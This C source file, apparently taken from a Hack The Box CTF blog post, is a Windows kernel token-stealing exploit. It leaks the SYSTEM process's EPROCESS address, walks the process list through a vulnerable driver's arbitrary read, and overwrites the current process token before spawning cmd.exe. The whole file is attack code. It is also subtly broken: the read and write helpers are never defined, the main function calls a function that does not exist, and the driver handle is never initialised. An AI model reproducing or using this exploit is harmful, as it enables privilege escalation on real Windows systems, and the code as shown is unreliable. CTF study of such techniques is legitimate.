// Source: https://www.hackthebox.com/blog/open-door-business-ctf

#include <windows.h>
#include <stdint.h>
#include <stdio.h>


typedef struct _SYSTEM_HANDLE {
    ULONG       ProcessId;        
    BYTE        ObjectTypeNumber; 
    BYTE        Flags;            
    USHORT      Handle;               
    PVOID       Object;           
    ACCESS_MASK GrantedAccess;    
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;


typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;            
    SYSTEM_HANDLE Handles[1];     
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;


typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemHandleInformation = 16,
    SystemObjectInformation = 17,
    
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);


uint64_t arbitrary_read(HANDLE driver, PVOID address);
VOID     arbitrary_write(HANDLE driver, uint64_t value, PVOID address);


PVOID find_eprocess_base_address(DWORD pid) {
    HINSTANCE hNtDLL = LoadLibraryA("ntdll.dll");
    PSYSTEM_HANDLE_INFORMATION buffer;
    ULONG bufferSize = 0xffffff;
    buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(bufferSize);
    NTSTATUS status;
    PVOID ProcAddress = NULL;
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)(GetProcAddress(hNtDLL, "NtQuerySystemInformation"));
    
    status = NtQuerySystemInformation(0x10, buffer, bufferSize, NULL);
    
    for (ULONG i = 0; i <= buffer->HandleCount; i++) {
        if ((buffer->Handles[i].ProcessId == pid)) {
            ProcAddress = buffer->Handles[i].Object;
            break;
        }
    }
    free(buffer);
    return ProcAddress;
}


#define UniqueProcessId_off     0x440
#define ActiveProcessLinks_off  0x448
#define Token_off               0x4b8



PVOID LocateCurrentProc(HANDLE hBKD, PVOID SYSTEM) {
    DWORD pid = GetCurrentProcessId();
    DWORD curPid;
    PVOID current = SYSTEM;

    do {
        // Follow the next process link
        current = (PVOID)(arbitrary_read(hBKD, (PVOID)((uint64_t)current + ActiveProcessLinks_off)) - ActiveProcessLinks_off);

        // Read the PID of 'current'
        curPid = (DWORD)arbitrary_read(hBKD, (PVOID)((uint64_t)current + UniqueProcessId_off));


        if (curPid == pid) {
            break;
        }
    } while (current != SYSTEM);

    if (current == SYSTEM) {
        return NULL;
    }
    
    return current;
}




int main(){

    HANDLE driver;



    PVOID system_proc_base_addr  = FindBaseAddress(4);
    PVOID current_proc_base_addr = LocateCurrentProc(driver, system_proc_base_addr);

    
    PVOID system_proc_token_addr  =  system_proc_base_addr + Token_off;
    PVOID current_proc_token_addr =  current_proc_base_addr + Token_off;

    uint64_t system_token_value = arbitrary_read(driver, system_proc_token_addr);


    arbitrary_write(driver, (uint64_t)system_token_value, current_proc_token_addr);

    system("start cmd.exe");

    return 0;
}